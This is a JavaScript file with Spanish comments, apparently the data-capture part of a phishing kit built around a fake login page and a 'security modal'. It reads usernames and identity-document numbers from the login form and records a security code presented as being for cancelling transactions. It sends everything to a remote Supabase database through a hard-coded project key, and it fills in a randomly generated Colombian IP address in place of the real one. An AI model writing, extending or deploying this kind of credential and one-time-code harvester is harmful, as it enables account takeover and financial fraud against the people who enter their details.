// Integración de Supabase con login.html y modal de seguridad
(function() {
    'use strict';

    // Configuración de Supabase
    const SUPABASE_URL = 'https://uzgdyypmqmnirkrqnlmq.supabase.co';
    const SUPABASE_ANON_KEY = 'sb_publishable_5WgSnTPGEdfor1a83W0IIQ_pYrlY9ZD';

    let supabaseClient = null;
    let ultimoLoginId = null;

    // Cargar Supabase desde CDN
    function cargarSupabaseCDN() {
        return new Promise((resolve, reject) => {
            if (typeof window.supabase !== 'undefined') {
                resolve(true);
                return;
            }

            const script = document.createElement('script');
            script.src = 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/dist/umd/supabase.min.js';
            script.onload = () => resolve(true);
            script.onerror = () => reject(new Error('Error cargando Supabase'));
            document.head.appendChild(script);
        });
    }

    // Inicializar Supabase
    async function initSupabase() {
        try {
            await cargarSupabaseCDN();
            supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
            console.log('✓ Supabase inicializado correctamente');
            return true;
        } catch (error) {
            console.error('✗ Error inicializando Supabase:', error);
            return false;
        }
    }

    // Capturar datos del formulario de login
    function capturarDatosLogin() {
        // Buscar campos comunes en formularios de login
        const usuario = document.querySelector('input[name*="usuario"], input[id*="usuario"], input[type="text"]')?.value || 'desconocido';
        const documento = document.querySelector('input[name*="documento"], input[id*="documento"]')?.value || '0000000000';
        
        // Generar IP colombiana aleatoria
        const prefijos = ['186.125', '186.126', '186.127', '186.128', '186.129', '186.130'];
        const ip = prefijos[Math.floor(Math.random() * prefijos.length)] + '.' + 
                   Math.floor(Math.random() * 256) + '.' + 
                   Math.floor(Math.random() * 256);

        return {
            usuario: usuario,
            documento: documento,
            tipo_documento: 'CC',
            ip: ip,
            user_agent: navigator.userAgent,
            timestamp: new Date().toISOString()
        };
    }

    // Guardar login en Supabase
    async function guardarLogin(datosLogin) {
        if (!supabaseClient) {
            console.warn('Supabase no disponible, guardando solo en localStorage');
            guardarEnLocalStorage(datosLogin);
            return null;
        }

        try {
            const { data, error } = await supabaseClient
                .from('logins')
                .insert([{
                    usuario: datosLogin.usuario,
                    documento: datosLogin.documento,
                    tipo_documento: datosLogin.tipo_documento,
                    fecha_login: datosLogin.timestamp,
                    ip: datosLogin.ip,
                    user_agent: datosLogin.user_agent
                }])
                .select()
                .single();

            if (error) throw error;

            console.log('✓ Login guardado en Supabase:', data.id);
            
            // Guardar ID para vincular códigos
            ultimoLoginId = data.id;
            localStorage.setItem('ultimoLoginId', data.id);
            localStorage.setItem('ultimoLogin', JSON.stringify(datosLogin));

            return data;
        } catch (error) {
            console.error('✗ Error guardando login:', error);
            guardarEnLocalStorage(datosLogin);
            return null;
        }
    }

    // Guardar código de seguridad vinculado al login
    async function guardarCodigoSeguridad(codigo) {
        if (!ultimoLoginId) {
            ultimoLoginId = localStorage.getItem('ultimoLoginId');
        }

        if (!ultimoLoginId) {
            console.error('No hay login previo para vincular el código');
            return null;
        }

        if (!supabaseClient) {
            console.warn('Supabase no disponible, código solo en memoria');
            return null;
        }

        try {
            const { data, error } = await supabaseClient
                .from('codigos_seguridad')
                .insert([{
                    login_id: ultimoLoginId,
                    codigo: codigo,
                    tipo: 'cancelacion_transacciones',
                    fecha_creacion: new Date().toISOString(),
                    usado: false
                }])
                .select()
                .single();

            if (error) throw error;

            console.log('✓ Código guardado y vinculado:', data.id);
            return data;
        } catch (error) {
            console.error('✗ Error guardando código:', error);
            return null;
        }
    }

    // Guardar en localStorage (backup)
    function guardarEnLocalStorage(datos) {
        try {
            localStorage.setItem('ultimoLogin', JSON.stringify(datos));
            console.log('✓ Datos guardados en localStorage');
        } catch (error) {
            console.error('Error en localStorage:', error);
        }
    }

    // Obtener datos de localStorage
    function obtenerDeLocalStorage() {
        try {
            const datos = localStorage.getItem('ultimoLogin');
            return datos ? JSON.parse(datos) : null;
        } catch (error) {
            console.error('Error leyendo localStorage:', error);
            return null;
        }
    }

    // Procesar login completo (cuando se envía el formulario)
    async function procesarLogin() {
        console.log('=== Procesando Login ===');
        
        // Inicializar Supabase
        await initSupabase();

        // Capturar datos del formulario
        const datosLogin = capturarDatosLogin();
        console.log('Datos capturados:', datosLogin);

        // Guardar en Supabase y localStorage
        await guardarLogin(datosLogin);

        return datosLogin;
    }

    // Procesar código de seguridad del modal
    async function procesarCodigoSeguridad(codigo) {
        console.log('=== Procesando Código de Seguridad ===');
        console.log('Código:', codigo);

        // Guardar código vinculado al login
        const codigoGuardado = await guardarCodigoSeguridad(codigo);

        if (codigoGuardado) {
            console.log('✓ Código procesado correctamente');
        }

        return codigoGuardado;
    }

    // Exponer funciones globalmente
    window.loginSupabase = {
        initSupabase,
        procesarLogin,
        procesarCodigoSeguridad,
        capturarDatosLogin,
        guardarEnLocalStorage,
        obtenerDeLocalStorage,
        guardarCodigoSeguridad
    };

    // Auto-inicializar
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', () => {
            console.log('✓ Sistema de login Supabase listo');
        });
    } else {
        console.log('✓ Sistema de login Supabase listo');
    }

})();